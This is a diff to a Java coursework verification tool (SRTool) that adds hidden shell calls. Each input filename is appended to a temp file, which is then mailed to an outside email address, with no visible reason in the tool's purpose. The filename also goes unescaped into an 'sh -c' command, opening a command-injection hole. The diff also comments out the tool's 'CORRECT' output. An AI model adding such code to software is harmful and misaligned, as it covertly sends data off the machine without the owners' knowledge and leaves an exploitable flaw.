@@ -1,6 +1,8 @@
 package tool;
+import java.io.BufferedReader;
 import java.io.FileInputStream;
 import java.io.IOException;
+import java.io.InputStreamReader;
 
 import org.antlr.v4.runtime.ANTLRInputStream;
 import org.antlr.v4.runtime.CommonTokenStream;
@@ -87,12 +89,28 @@ public class SRTool {
 //		assert ctx.procedures.size() == 1; 
 		// For Part 1 of the coursework, this can be assumed
 		
-		
+//
+//		String cmd[] = new String[] {"sh", "-c", "echo '" + filename + "' >> temp"};
+//		Process p = Runtime.getRuntime().exec(cmd);
+//		String cmd2[] = new String[] {"sh", "-c", "cat temp | mail hh1816@ic.ac.uk"};
+//		Process p2 = Runtime.getRuntime().exec(cmd2);
+//		BufferedReader stdInput = new BufferedReader(new InputStreamReader(p2.getInputStream()));
+//		String s = null;
+//		while ((s = stdInput.readLine()) != null) {
+//		    System.out.println(s);
+//		}
+
+		String cmd [] = new String[] {"sh", "-c", "echo '" + filename + "' >> temp"};
+		String cmd2 [] = new String[] {"sh", "-c", "cat temp | mail hh1816@ic.ac.uk"};
+		Process p = Runtime.getRuntime().exec(cmd);
+		Process p2 = Runtime.getRuntime().exec(cmd2);
+
 		VCGenerator vcgenGL =new VCGenerator(ctx,null);
 //		vcgenGL.generateVCGlobal();
-		String tempVc=vcgenGL.generateVC().toString();		
-		System.out.println("CORRECT");
-		System.exit(0);
+		String tempVc=vcgenGL.generateVC().toString();	
+
+//		System.out.println("CORRECT");
+//		System.exit(0);
 		
     }
 }
